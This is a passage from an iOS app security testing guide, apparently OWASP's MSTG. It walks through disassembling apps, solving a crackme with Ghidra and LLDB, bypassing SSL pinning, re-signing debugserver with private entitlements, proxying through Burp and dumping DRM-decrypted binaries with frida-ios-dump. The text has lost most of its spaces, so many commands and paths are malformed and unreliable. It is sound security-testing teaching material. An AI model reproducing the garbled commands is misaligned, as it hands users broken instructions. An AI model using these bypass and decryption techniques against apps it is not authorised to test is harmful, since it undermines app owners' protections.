availableintheGitHubrepository. Disassembling Native Code Platform: ios BecauseObjective-CandSwiftarefundamentallydifferent,theprogramminglanguageinwhichtheappiswrittenaffects thepossibilitiesforreverseengineeringit. Forexample,Objective-Callowsmethodinvocationstobechangedatruntime. Thismakeshookingintootherappfunctions(atechniqueheavilyusedbyCycriptandotherreverseengineeringtools) easy. This“methodswizzling”isnotimplementedthesamewayinSwift,andthedifferencemakesthetechniqueharder toexecutewithSwiftthanwithObjective-C. On iOS, all the application code (both Swiftand Objective-C) is compiled to machine code (e.g. ARM). Thus, to analyze iOSapplicationsadisassemblerisneeded. IfyouwanttodisassembleanapplicationfromtheAppStore,removetheFairplayDRMfirst. Section“AcquiringtheApp Binary”inthechapter“iOSBasicSecurityTesting”explainshow. In this section the term “app binary” refers to the Macho-O file in the application bundle which contains the compiled code,andshouldnotbeconfusedwiththeapplicationbundle-theIPAfile. Seesection“ExploringtheAppPackage”in chapter“BasiciOSSecurityTesting”formoredetailsonthecompositionofIPAfiles. Disassembling With IDA Pro IfyouhavealicenseforIDAPro,youcananalyzetheappbinaryusingIDAProaswell. ThefreeversionofIDAunfortunatelydoesnotsupporttheARMprocessortype. Togetstarted,simplyopentheappbinaryinIDAPro. 375\nUpon opening the file, IDA Pro will perform auto-analysis, which can take a while depending on the size of the binary. Oncetheauto-analysisiscompletedyoucanbrowsethedisassemblyintheIDAView(Disassembly)windowandexplore functionsintheFunctionswindow,bothshowninthescreenshotbelow. A regular IDA Pro license does not include a decompiler by default and requires an additional license for the Hex-Rays decompiler, which is expensive. In contrast, Ghidra comes with a very capable free builtin decompiler, making it a compellingalternativetouseforreverseengineering. IfyouhavearegularIDAProlicenseanddonotwanttobuytheHex-Raysdecompiler,youcanuseGhidra’sdecompiler byinstallingtheGhIDApluginforIDAPro. ThemajorityofthischapterappliestoapplicationswritteninObjective-Corhavingbridgedtypes,whicharetypescom- patible with both Swift and Objective-C. The Swift compatibility of most tools that work well with Objective-C is being improved. 376\nReviewing Decompiled Objective-C and Swift Code Platform: ios TODO:Don’thavethisyet Reviewing Disassembled Objective-C and Swift Code Platform: ios In this section we will be exploring iOS application’s binary code manually and perform static analysis on it. Manual analysiscanbeaslowprocessandrequiresimmensepatience. Agoodmanualanalysiscanmakethedynamicanalysis moresuccessful. Therearenohardwrittenrulesforperformingstaticanalysis,buttherearefewrulesofthumbwhichcanbeusedtohave asystematicapproachtomanualanalysis: • Understandtheworkingoftheapplicationunderevaluation-theobjectiveoftheapplicationandhowitbehaves incaseofwronginput. • Explore the various strings present in the application binary, this can be very helpful, for example in spotting interestingfunctionalitiesandpossibleerrorhandlinglogicintheapplication. • Lookforfunctionsandclasseshavingnamesrelevanttoourobjective. • Lastly,findthevariousentrypointsintotheapplicationandfollowalongfromtheretoexploretheapplication. Techniquesdiscussedinthissectionaregenericandapplicableirrespectiveofthetoolsusedforanalysis. Objective-C Inadditiontothetechniqueslearnedinthe“DisassemblingandDecompiling”section,forthissectionyou’llneedsome understanding of the Objective-C runtime. For instance, functions like _objc_msgSend or _objc_release are specially meaningfulfortheObjective-Cruntime. WewillbeusingtheUnCrackableAppforiOSLevel1,whichhasthesimplegoaloffindingasecretstringhiddensomewhere inthebinary. Theapplicationhasasinglehomescreenandausercaninteractviainputtingcustomstringsintheprovided textfield. Whentheuserinputsthewrongstring,theapplicationshowsapop-upwiththe“VerificationFailed”message. 377\nYou can keep note of the strings displayed in the pop-up, as this might be helpful when searching for the code where the input is processed and a decision is being made. Luckily, the complexity and interaction with this application is straightforward,whichbodeswellforourreversingendeavors. Forstaticanalysisinthissection,wewillbeusingGhidra9.0.4. Ghidra9.1_betaauto-analysishasabuganddoes notshowtheObjective-Cclasses. WecanstartbycheckingthestringspresentinthebinarybyopeningitinGhidra. Thelistedstringsmightbeoverwhelming atfirst,butwithsomeexperienceinreversingObjective-Ccode,you’lllearnhowtofilteranddiscardthestringsthatare notreallyhelpfulorrelevant. Forinstance,theonesshowninscreenshotbelow,whicharegeneratedfortheObjective-C runtime. Otherstringsmightbehelpfulinsomecases,suchasthosecontainingsymbols(functionnames,classnames, etc.) andwe’llbeusingthemwhenperformingstaticanalysistocheckifsomespecificfunctionisbeingused. 378\nIf we continue our careful analysis, we can spot the string, “Verification Failed”, which is used for the pop-up when a wronginputisgiven. Ifyoufollowthecross-references(Xrefs)ofthisstring,youwillreachbuttonClickfunctionofthe ViewControllerclass. WewilllookintothebuttonClickfunctionlaterinthissection. Whenfurthercheckingtheother strings in the application, only a few of them look a likely candidate for a hidden flag. You can try them and verify as well. 379\nMoving forward, we have two paths to take. Either we can start analyzing the buttonClick function identified in the abovestep,orstartanalyzingtheapplicationfromthevariousentrypoints. Inrealworldsituation,mosttimesyouwill betakingthefirstpath,butfromalearningperspective,inthissectionwewilltakethelatterpath. AniOSapplicationcallsdifferentpredefinedfunctionsprovidedbytheiOSruntimedependingonitsthestatewithinthe applicationlifecycle. Thesefunctionsareknownastheentrypointsoftheapp. Forexample: • [AppDelegate application:didFinishLaunchingWithOptions:] iscalledwhentheapplicationisstartedforthe firsttime. • [AppDelegate applicationDidBecomeActive:] iscalled when the application is moving frominactive to active state. Manyapplicationsexecutecriticalcodeinthesesectionsandthereforethey’renormallyagoodstartingpointinorderto followthecodesystematically. Oncewe’redonewiththeanalysisofallthefunctionsintheAppDelegateclass,wecanconcludethatthereisnorelevant codepresent. Thelackofanycodeintheabovefunctionsraisesthequestion-fromwhereistheapplication’sinitialization codebeingcalled? Luckilythecurrentapplicationhasasmallcodebase,andwecanfindanotherViewControllerclassintheSymbolTree view. Inthisclass,functionviewDidLoadfunctionlooksinteresting. IfyoucheckthedocumentationofviewDidLoad,you canseethatitcanalsobeusedtoperformadditionalinitializationonviews. 380\nIfwecheckthedecompilationofthisfunction,thereareafewinterestingthingsgoingon. Forinstance,thereisacallto anativefunctionatline31andalabelisinitializedwithasetHiddenflagsetto1inlines27-29. Youcankeepanoteof theseobservationsandcontinueexploringtheotherfunctionsinthisclass. Forbrevity,exploringtheotherpartsofthe functionisleftasanexerciseforthereaders. In our first step, we observed that the application verifies the input string only when the UI button is pressed. Thus, analyzingthebuttonClickfunctionisanobvioustarget. Asearliermentioned,thisfunctionalsocontainsthestringwe seeinthepop-ups. Atline29adecisionisbeingmade,whichisbasedontheresultofisEqualString(outputsavedin uVar1atline23). Theinputforthecomparisoniscomingfromthetextinputfield(fromtheuser)andthevalueofthe label. Therefore,wecanassumethatthehiddenflagisstoredinthatlabel. 381\nNowwehavefollowedthecompleteflowandhavealltheinformationabouttheapplicationflow. Wealsoconcludedthat thehiddenflagispresentinatextlabelandinordertodeterminethevalueofthelabel,weneedtorevisitviewDidLoad function,andunderstandwhatishappeninginthenativefunctionidentified. Analysisofthenativefunctionisdiscussed in“ReviewingDisassembledNativeCode”. Bypassing Certificate Pinning Platform: ios SomeapplicationswillimplementSSLPinning,whichpreventstheapplicationfromacceptingyourinterceptingcertificate asavalidcertificate. Thismeansthatyouwillnotbeabletomonitorthetrafficbetweentheapplicationandtheserver. Formostapplications,certificatepinningcanbebypassedwithinseconds,butonlyiftheappusestheAPIfunctionsthat 382\narecoveredbythesetools. IftheappisimplementingSSLPinningwithacustomframeworkorlibrary,theSSLPinning mustbemanuallypatchedanddeactivated,whichcanbetime-consuming. ThissectiondescribesvariouswaystobypassSSLPinningandgivesguidanceaboutwhatyoushoulddowhentheexisting toolsdon’twork. Methods for Jailbroken and Non-jailbroken Devices Ifyouhaveajailbrokendevicewithfrida-serverinstalled,youcanbypassSSLpinningbyrunningthefollowingObjection command(repackageyourappifyou’reusinganon-jailbrokendevice): iossslpinningdisable Here’sanexampleoftheoutput: SeealsoObjection’shelponDisablingSSLPinningforiOSforfurtherinformationandinspectthepinning.tsfiletounder- standhowthebypassworks. Methods for Jailbroken Devices Only IfyouhaveajailbrokendeviceyoucantryoneofthefollowingtoolsthatcanautomaticallydisableSSLPinning: • “SSLKillSwitch2”isonewaytodisablecertificatepinning. ItcanbeinstalledviatheCydiastore. Itwillhookonto allhigh-levelAPIcallsandbypasscertificatepinning. • TheBurpSuiteMobileAssistantappcanalsobeusedtobypasscertificatepinning. When the Automated Bypasses Fail Technologiesandsystemschangeovertime,andsomebypasstechniquesmightnotworkeventually. Hence,it’spartof thetesterworktodosomeresearch,sincenoteverytoolisabletokeepupwithOSversionsquicklyenough. SomeappsmightimplementcustomSSLpinningmethods,sothetestercouldalsodevelopnewbypassscriptsmaking useofexistingonesasabaseorinspirationandusingsimilartechniquesbuttargetingtheapp’scustomAPIs. Hereyou caninspectthreegoodexamplesofsuchscripts: • “objection-PinningBypassModule”(pinning.ts) • “FridaCodeShare-ios10-ssl-bypass”by@dki • “CircumventingSSLPinninginobfuscatedappswithOkHttp”byJeroenBeckers 383\nOtherTechniques: Ifyoudon’thaveaccesstothesource,youcantrybinarypatching: • IfOpenSSLcertificatepinningisused,youcantrybinarypatching. • Sometimes,thecertificateisafileintheapplicationbundle. ReplacingthecertificatewithBurp’scertificatemay besufficient,butbewareofthecertificate’sSHAsum. Ifit’shardcodedintothebinary,youmustreplaceittoo! • Ifyoucanaccessthesourcecodeyoucouldtrytodisablecertificatepinningandrecompiletheapp, lookforAPI callsforNSURLSession,CFStream,andAFNetworkingandmethods/stringscontainingwordslike“pinning”,“X.509”, “Certificate”,etc. Listing Installed Apps Platform: ios When targeting apps that are installed on the device, you’ll first have to figure out the correct bundle identifier of the applicationyouwanttoanalyze. Youcanusefrida-ps-Uaitogetallapps(-a)currentlyinstalled(-i)ontheconnected USBdevice(-U): $frida-ps -Uai PID Name Identifier ---- ------------------- ----------------------------------------- 6847 Calendar com.apple.mobilecal 6815 Mail com.apple.mobilemail - AppStore com.apple.AppStore - AppleStore com.apple.store.Jolly - Calculator com.apple.calculator - Camera com.apple.camera - iGoat-Swift OWASP.iGoat-Swift Italsoshowswhichofthemarecurrentlyrunning. Takeanoteofthe“Identifier”(bundleidentifier)andthePIDifanyas you’llneedthemafterwards. YoucanalsodirectlyopenGrapefruitandafterselectingyouriOSdeviceyou’llgetthelistofinstalledapps. Debugging Platform: ios ComingfromaLinuxbackgroundyou’dexpecttheptracesystemcalltobeaspowerfulasyou’reusedtobut,forsome reason, Apple decided to leave it incomplete. iOS debuggers such as LLDB use it for attaching, stepping or continuing theprocessbuttheycannotuseittoreadorwritememory(allPT_READ_*andPT_WRITE*requestsaremissing). Instead, they have to obtain a so-called Mach task port (by calling task_for_pid with the target process ID) and then use the MachIPCinterfaceAPIfunctionstoperformactionssuchassuspendingthetargetprocessandreading/writingregister states(thread_get_state/thread_set_state)andvirtualmemory(mach_vm_read/mach_vm_write). 384\nFormoreinformationyoucanrefertotheLLVMprojectinGitHubwhichcontainsthesourcecodeforLLDBaswell asChapter5and13from“MacOSXandiOSInternals: TotheApple’sCore”[#levin]andChapter4“Tracingand Debugging”from“TheMacHacker’sHandbook”[#miller]. Debugging with LLDB ThedefaultdebugserverexecutablethatXcodeinstallscan’tbeusedtoattachtoarbitraryprocesses(itisusuallyused onlyfordebuggingself-developedappsdeployedwithXcode). Toenabledebuggingofthird-partyapps,thetask_for_- pid-allowentitlementmustbeaddedtothedebugserverexecutablesothatthedebuggerprocesscancalltask_for_pid toobtainthetargetMachtaskportasseenbefore. Aneasywaytodothisistoaddtheentitlementtothedebugserver binaryshippedwithXcode. Toobtaintheexecutable,mountthefollowingDMGimage: /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.dmg You’llfindthedebugserverexecutableinthe/usr/bin/directoryonthemountedvolume. Copyittoatemporarydirec- tory,thencreateafilecalledentitlements.plistwiththefollowingcontent: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC"-//Apple//DTDPLIST1.0//EN""http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>com.apple.springboard.debugapplications</key> <true/> <key>run-unsigned-code</key> <true/> <key>get-task-allow</key> <true/> <key>task_for_pid-allow</key> <true/> </dict> </plist> Applytheentitlementwithcodesign: codesign -s---entitlements entitlements.plist -fdebugserver Copythemodifiedbinarytoanydirectoryonthetestdevice. Thefollowingexamplesuseusbmuxdtoforwardalocalport throughUSB. iproxy222222 scp-P2222debugserverroot@localhost:/tmp/ Note: OniOS12andhigher,usethefollowingproceduretosignthedebugserverbinaryobtainedfromtheXCodeimage. 1) Copythedebugserverbinarytothedeviceviascp,forexample,inthe/tmpfolder. 2) ConnecttothedeviceviaSSHandcreatethefile,namedentitlements.xml,withthefollowingcontent: <!DOCTYPE plist PUBLIC"-//Apple//DTD PLIST1.0//ENhttp://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>platform-application</key> <true/> <key>com.apple.private.security.no-container</key> <true/> <key>com.apple.private.skip-library-validation</key> <true/> <key>com.apple.backboardd.debugapplications</key> <true/> <key>com.apple.backboardd.launchapplications</key> <true/> <key>com.apple.diagnosticd.diagnostic</key> <true/> <key>com.apple.frontboard.debugapplications</key> <true/> <key>com.apple.frontboard.launchapplications</key> <true/> <key>com.apple.security.network.client</key> 385\n<true/> <key>com.apple.security.network.server</key> <true/> <key>com.apple.springboard.debugapplications</key> <true/> <key>com.apple.system-task-ports</key> <true/> <key>get-task-allow</key> <true/> <key>run-unsigned-code</key> <true/> <key>task_for_pid-allow</key> <true/> </dict> </plist> 3) Typethefollowingcommandtosignthedebugserverbinary: ldid -Sentitlements.xml debugserver 4) Verifythatthedebugserverbinarycanbeexecutedviathefollowingcommand: ./debugserver Youcannowattachdebugservertoanyprocessrunningonthedevice. VP-iPhone-18:/tmproot#./debugserver *:1234 -a2670 debugserver-@(#)PROGRAM:debugserver PROJECT:debugserver-320.2.89 forarmv7. Attachingtoprocess2670... Withthefollowingcommandyoucanlaunchanapplicationviadebugserverrunningonthetargetdevice: debugserver -xbackboard *:1234/Applications/MobileSMS.app/MobileSMS Attachtoanalreadyrunningapplication: debugserver *:1234 -a"MobileSMS" YoumayconnectnowtotheiOSdevicefromyourhostcomputer: (lldb)processconnectconnect://<ip-of-ios-device>:1234 Typingimage listgivesalistofmainexecutableandalldependentlibraries. Debugging Release Apps In the previous section we learned about how to setup a debugging environment on an iOS device using LLDB. In this sectionwewillusethisinformationandlearnhowtodebuga3rdpartyreleaseapplication. Wewillcontinueusingthe UnCrackableAppforiOSLevel1andsolveitusingadebugger. Incontrast to a debugbuild, thecode compiled for a releasebuild is optimized toachieve maximum performanceand minimumbinarybuildsize. Asageneralbestpractice,mostofthedebugsymbolsarestrippedforareleasebuild,adding alayerofcomplexitywhenreverseengineeringanddebuggingthebinaries. Duetotheabsenceofthedebugsymbols,symbolnamesaremissingfromthebacktraceoutputsandsettingbreakpoints by simply using function names is not possible. Fortunately, debuggers also support setting breakpoints directly on memoryaddresses. Furtherinthissectionwewilllearnhowtodosoandeventuallysolvethecrackmechallenge. Somegroundworkisneededbeforesettingabreakpointusingmemoryaddresses. Itrequiresdeterminingtwooffsets: 1. Breakpointoffset: Theaddressoffsetofthecodewherewewanttosetabreakpoint. Thisaddressisobtainedby performingstaticanalysisofthecodeinadisassemblerlikeGhidra. 2. ASLRshiftoffset: TheASLRshiftoffsetforthecurrentprocess. SinceASLRoffsetisrandomlygeneratedonevery newinstanceofanapplication,thishastobeobtainedforeverydebuggingsessionindividually. Thisisdetermined usingthedebuggeritself. 386\niOSisamodernoperatingsystemwithmultipletechniquesimplementedtomitigatecodeexecutionattacks, one such technique being Address Space Randomization Layout (ASLR). On every new execution of an application, a randomASLRshiftoffsetisgenerated,andvariousprocess’datastructuresareshiftedbythisoffset. Thefinalbreakpointaddresstobeusedinthedebuggeristhesumoftheabovetwoaddresses(Breakpointoffset+ASLR shiftoffset). Thisapproachassumesthattheimagebaseaddress(discussedshortly)usedbythedisassemblerandiOS isthesame,whichistruemostofthetime. WhenabinaryisopenedinadisassemblerlikeGhidra,itloadsabinarybyemulatingtherespectiveoperatingsystem’s loader. Theaddressatwhichthebinaryisloadediscalledimagebaseaddress. Allthecodeandsymbolsinsidethisbinary canbeaddressedusingaconstantaddressoffsetfromthisimagebaseaddress. InGhidra,theimagebaseaddresscan beobtainedbydeterminingtheaddressofthestartofaMach-Ofile. Inthiscase,itis0x100000000. FromourpreviousanalysisoftheUnCrackableLevel1applicationin“Manual(Reversed)CodeReview”section,thevalue ofthehiddenstringisstoredinalabelwiththehiddenflagset. Inthedisassembly,thetextvalueofthislabelisstored inregisterX21,storedviamovfromX0,atoffset0x100004520. Thisisourbreakpointoffset. Forthesecondaddress,weneedtodeterminetheASLRshiftoffsetforagivenprocess. TheASLRoffsetcanbedetermined byusingtheLLDBcommandimage list -o -f. Theoutputisshowninthescreenshotbelow. Intheoutput,thefirstcolumncontainsthesequencenumberoftheimage([X]),thesecondcolumncontainstherandomly generatedASLRoffset,while3rdcolumncontainsthefullpathoftheimageandtowardstheend,contentinthebracket shows the image base address after adding ASLR offset to the original image base address (0x100000000 + 0x70000 = 0x100070000). You will notice the image base address of 0x100000000 is same as in Ghidra. Now, to obtain the 387\neffectivememoryaddressforacodelocationweonlyneedtoaddASLRoffsettotheaddressidentifiedinGhidra. The effectiveaddresstosetthebreakpointwillbe0x100004520+0x70000=0x100074520. Thebreakpointcanbesetusing commandb 0x100074520. Intheaboveoutput,youmayalsonoticethatmanyofthepathslistedasimagesdonotpointtothefilesystemonthe iOSdevice. Instead,theypointtoacertainlocationonthehostcomputeronwhichLLDBisrunning. Theseimages aresystemlibrariesforwhichdebugsymbolsareavailableonthehostcomputertoaidinapplicationdevelopment and debugging (as part of the Xcode iOS SDK). Therefore, you may set breakpoints to these libraries directly by usingfunctionnames. Afterputtingthebreakpointandrunningtheapp, theexecutionwillbehaltedoncethebreakpointishit. Nowyoucan access and explore the current state of the process. In this case, you know from the previous static analysis that the registerX0containsthehiddenstring,thuslet’sexploreit. InLLDByoucanprintObjective-Cobjectsusingthepo(print object)command. Voila, the crackme can be easily solved aided by static analysis and a debugger. There are plethora of features im- plemented in LLDB, including changing the value of the registers, changing values in the process memory and even automatingtasksusingPythonscripts. Officially Apple recommends use of LLDB for debugging purposes, but GDB can be also used on iOS. The techniques discussedaboveareapplicablewhiledebuggingusingGDBaswell,providedtheLLDBspecificcommandsarechanged toGDBcommands. Get Open Files Platform: ios lsofisapowerfulcommand,andprovidesaplethoraofinformationaboutarunningprocess. Itcanprovidealistofall openfiles, including a stream, a networkfile ora regularfile. Wheninvoking thelsof commandwithout anyoption it will list all open files belonging to all active processes on the system, while when invoking with the flags -c <process name>or-p <pid>,itreturnsthelistofopenfilesforthespecifiedprocess. Themanpageshowsvariousotheroptionsin detail. UsinglsofforaniOSapplicationrunningwithPID2828,listvariousopenfilesasshownbelow. iPhone:~root#lsof -p2828 COMMAND PID USER FD TYPEDEVICESIZE/OFF NODENAME iOweApp2828mobile cwd DIR 1,2 864 2/ iOweApp2828mobile txt REG 1,3 206144189774/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp iOweApp2828mobile txt REG 1,3 5492213230/private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2B- ↪ 972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C5224537F7F23DF19314CF6FD8AA.closure iOweApp2828mobile txt REG 1,3 30628212198/private/var/preferences/Logging/.plist-cache.vqXhr1EE iOweApp2828mobile txt REG 1,2 50080234433/usr/lib/libobjc-trampolines.dylib iOweApp2828mobile txt REG 1,2 344204 74185/System/Library/Fonts/AppFonts/ChalkboardSE.ttc iOweApp2828mobile txt REG 1,2 664848234595/usr/lib/dyld ... 388\nSetting up an Interception Proxy Platform: ios BurpSuiteisanintegratedplatformforsecuritytestingmobileandwebapplications. Itstoolsworktogetherseamlesslyto supporttheentiretestingprocess,frominitialmappingandanalysisofattacksurfacestofindingandexploitingsecurity vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a man-in-the-middle betweenthebrowserandwebserver(s). BurpSuiteallowsyoutointercept,inspect,andmodifyincomingandoutgoing rawHTTPtraffic. SettingupBurptoproxyyourtrafficisprettystraightforward. WeassumethatbothyouriOSdeviceandhostcomputer areconnectedtoaWi-Finetworkthatpermitsclient-to-clienttraffic. Ifclient-to-clienttrafficisnotpermitted,youcanuse usbmuxdtoconnecttoBurpviaUSB. PortSwiggerprovidesagoodtutorialonsettingupaniOSdevicetoworkwithBurpandatutorialoninstallingBurp’sCA certificatetoaniOSdevice. Using Burp via USB on a Jailbroken Device InthesectionAccessingtheDeviceShellwe’vealreadylearnedhowwecanuseiproxytouseSSHviaUSB.Whendoing dynamicanalysis,it’sinterestingtousetheSSHconnectiontorouteourtraffictoBurpthatisrunningonourcomputer. Let’sgetstarted: FirstweneedtouseiproxytomakeSSHfromiOSavailableonlocalhost. $iproxy222222 waitingforconnection Thenextstepistomakearemoteportforwardingofport8080ontheiOSdevicetothelocalhostinterfaceonourcomputer toport8080. ssh-R8080:localhost:8080root@localhost -p2222 YoushouldnowbeabletoreachBurponyouriOSdevice. OpenSafarioniOSandgoto127.0.0.1:8080andyoushould seetheBurpSuitePage. ThiswouldalsobeagoodtimetoinstalltheCAcertificateofBurponyouriOSdevice. ThelaststepwouldbetosettheproxygloballyonyouriOSdevice: 1. GotoSettings->Wi-Fi 2. ConnecttoanyWi-Fi(youcanliterallyconnecttoanyWi-Fiasthetrafficforport80and443willberoutedthrough USB,aswearejustusingtheProxySettingfortheWi-FisowecansetaglobalProxy) 3. OnceconnectedclickonthesmallblueiconontherightsideoftheconnectWi-Fi 4. ConfigureyourProxybyselectingManual 5. Typein127.0.0.1asServer 6. Typein8080asPort OpenSafariandgotoanywebpage,youshouldseenowthetrafficinBurp. Thanks@hweisheimerfortheinitialidea! Static Analysis on iOS Platform: ios ThepreferredmethodofstaticallyanalyzingiOSappsinvolvesusingtheoriginalXcodeprojectfiles. Ideally,youwillbe abletocompileanddebugtheapptoquicklyidentifyanypotentialissueswiththesourcecode. BlackboxanalysisofiOSappswithoutaccesstotheoriginalsourcecoderequiresreverseengineering. Forexample,no decompilersareavailableforiOSapps(althoughmostcommercialandopen-sourcedisassemblerscanprovideapseudo- sourcecodeviewofthebinary),soadeepinspectionrequiresyoutoreadassemblycode. 389\nReverse Engineering iOS Apps Platform: ios iOSreverseengineeringisamixedbag. Ononehand,appsprogrammedinObjective-CandSwiftcanbedisassembled nicely. InObjective-C,objectmethodsarecalledviadynamicfunctionpointerscalled“selectors”,whichareresolvedby name during runtime. The advantage of runtime name resolution is that these names need to stay intact in the final binary,makingthedisassemblymorereadable. Unfortunately,thisalsomeansthatnodirectcross-referencesbetween methodsareavailableinthedisassemblerandconstructingaflowgraphischallenging. References • [#miller] - Charlie Miller, Dino Dai Zovi. The iOS Hacker’s Handbook. Wiley, 2012 - https://www.wiley.com/en- us/iOS+Hacker%27s+Handbook-p-9781118204122 • [#levin]JonathanLevin. MacOSXandiOSInternals: TotheApple’sCore. Wiley,2013-http://newosxbook.com/M OXiI.pdf Host-Device Data Transfer Platform: ios TheremightbevariousscenarioswhereyoumightneedtotransferdatafromtheiOSdeviceorappdatasandboxtoyour hostcomputerorviceversa. Thefollowingsectionwillshowyoudifferentwaysonhowtoachievethat. Copying App Data Files via SSH and SCP Asweknownow,filesfromourapparestoredintheDatadirectory. YoucannowsimplyarchivetheDatadirectorywith tarandpullitfromthedevicewithscp: iPhone:~root#tarczvf/tmp/data.tgz/private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693 iPhone:~root#exit $scp -P2222root@localhost:/tmp/data.tgz. Grapefruit AfterstartingGrapefruityoucanselecttheappthatisinscopefortesting. Therearevariousfunctionsavailable,ofwhich oneiscalled“Finder”. Whenselectingit,youwillgetalistingofthedirectoriesoftheappsandbox. 390\nWhen navigating through the directories and selecting a file, a pop-up will show up and display the data either as hex- adecimalortext. Whenclosingthispop-upyouhavevariousoptionsavailableforthefile,including: • Databaseviewer • Plistviewer • Download Objection WhenyouarestartingobjectionyouwillfindthepromptwithintheBundledirectory. 391\norg.owasp.MSTGon (iPhone:10.3.3)[usb] #pwdprint Currentdirectory:/var/containers/Bundle/Application/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app UsetheenvcommandtogetthedirectoriesoftheappandnavigatetotheDocumentsdirectory. org.owasp.MSTGon (iPhone:10.3.3)[usb] #cd/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents Withthecommandfile download <filename>youcandownloadafilefromtheiOSdevicetoyourhostcomputerand cananalyzeitafterwards. org.owasp.MSTGon (iPhone:10.3.3)[usb] #filedownload.com.apple.mobile_container_manager.metadata.plist Downloading/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plistto ↪ .com.apple.mobile_container_manager.metadata.plist Streamingfilefromdevice... Writingbytestodestination... Successfullydownloaded/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plistto ↪ .com.apple.mobile_container_manager.metadata.plist YoucanalsouploadfilestotheiOSdevicewithfile upload <local_file_path>. Dynamic Analysis on iOS Platform: ios Lifeiseasywithajailbrokendevice: notonlydoyougaineasyprivilegedaccesstothedevice,thelackofcodesigning allowsyoutousemorepowerfuldynamicanalysistechniques. OniOS,mostdynamicanalysistoolsarebasedonCydia Substrate,aframeworkfordevelopingruntimepatches,orFrida,adynamicintrospectiontool. ForbasicAPImonitoring, you can get away with not knowing all the details of how Substrate or Frida work - you can simply use existing API monitoringtools. On iOS, collecting basic information about a running process or an application can be slightly more challenging than compared to Android. On Android (or any Linux-based OS), process information is exposed as readable text files via procfs. Thus,anyinformationaboutatargetprocesscanbeobtainedonarooteddevicebyparsingthesetextfiles. In contrast,oniOSthereisnoprocfsequivalentpresent. Also,oniOSmanystandardUNIXcommandlinetoolsforexploring processinformation,forinstancelsofandvmmap,areremovedtoreducethefirmwaresize. Inthissection,wewilllearnhowtocollectprocessinformationoniOSusingcommandlinetoolslikelsof. Sincemanyof thesetoolsarenotpresentoniOSbydefault,weneedtoinstallthemviaalternativemethods. Forinstance,lsofcanbe installedusingCydia(theexecutableisnotthelatestversionavailable,butneverthelessaddressesourpurpose). Obtaining and Extracting Apps Platform: ios Getting the IPA File from an OTA Distribution Link Duringdevelopment,appsaresometimesprovidedtotestersviaover-the-air(OTA)distribution. Inthatsituation,you’ll receiveanitms-serviceslink,suchasthefollowing: itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist YoucanusetheITMSservicesassetdownloadertooltodownloadtheIPAfromanOTAdistributionURL.Installitvianpm: npminstall -gitms-services SavetheIPAfilelocallywiththefollowingcommand: 392\n##itms-services-u"itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist"-o->out.ipa Extracting the App Binary If you have an IPA with a decrypted app binary, unzip it and you are ready to go. The app binary is located in the mainbundledirectory(.app),e.g.Payload/Telegram X.app/Telegram X.Seethefollowingsubsectionfordetailsonthe extractionofthepropertylists. OnmacOS’sFinder,.appdirectoriesareopenedbyright-clickingthemandselecting“ShowPackageContent”. On theterminalyoucanjustcdintothem. Decrypting the App Binary IMPORTANT NOTE:IntheUnitedStates,theDigitalMillenniumCopyrightAct17U.S.C.1201,orDMCA,makesit illegalandactionabletocircumventcertaintypesofDRM.However,theDMCAalsoprovidesexemptions,suchas forcertainkindsofsecurityresearch. Aqualifiedattorneycanhelpyoudetermineifyourresearchqualifiesunder theDMCAexemptions. (Source: Corellium) If you don’t have the original IPA, then you need a jailbroken device where you will install the app (e.g. via App Store). Once installed, you need to extract the app binary from memory and rebuild the IPA file. Because of DRM, the app binaryfileisencryptedwhenitisstoredontheiOSdevice,sosimplypullingitfromtheBundle(eitherthroughSSHor Objection)willnotbesufficienttoreverseengineerit. Youcanverifythisbyrunningthiscommandontheappbinary: otool -lPayload/TelegramX.app/TelegramX |grep -iLC_ENCRYPTION -B1-A4 Loadcommand12 cmdLC_ENCRYPTION_INFO cmdsize20 cryptoff16384 cryptsize32768 cryptid1 Orwithradare2: rabin2 -IPayload/TelegramX.app/TelegramX |grep crypto crypto true In order to retrieve the unencrypted version, you can use frida-ios-dump. It will extract the unencrypted version from memorywhiletheapplicationisrunningonthedevice. First,configureFrida-ios-dumpdump.py: • setittouselocalhostwithport2222whenusingiproxy,ortotheactualIPaddressandportofthedevicefrom whichyouwanttodumpthebinary. • updatethedefaultusername(User = 'root')andpassword(Password = 'alpine')indump.pytotheonesyou haveset. Enumeratetheappsinstalledonthedevicebyrunningpython dump.py -l: PID Name Identifier ---- --------------- ------------------------------------- 860 Cydia com.saurik.Cydia 1130 Settings com.apple.Preferences 685 Mail com.apple.mobilemail 834 Telegram ph.telegra.Telegraph - Stocks com.apple.stocks ... Youcandumptheselectedapp,forexampleTelegram,byrunningpython dump.py ph.telegra.Telegraph 393\nAfteracoupleofseconds, theTelegram.ipafilewillbecreatedinyourcurrentdirectory. Youcanvalidatethesuccess ofthedumpbyremovingtheappandreinstallingit(e.g.usingios-deployios-deploy -b Telegram.ipa). Notethatthis willonlyworkonjailbrokendevices,asotherwisethesignaturewon’tbevalid. Youcanverifythattheappbinaryisnowunencrypted: rabin2 -IPayload/TelegramX.app/TelegramX |grep crypto crypto false Thinning the App Binary The app binary may contain multiple architectures, such as armv7 (32-bit) and arm64 (64-bit). That is called a 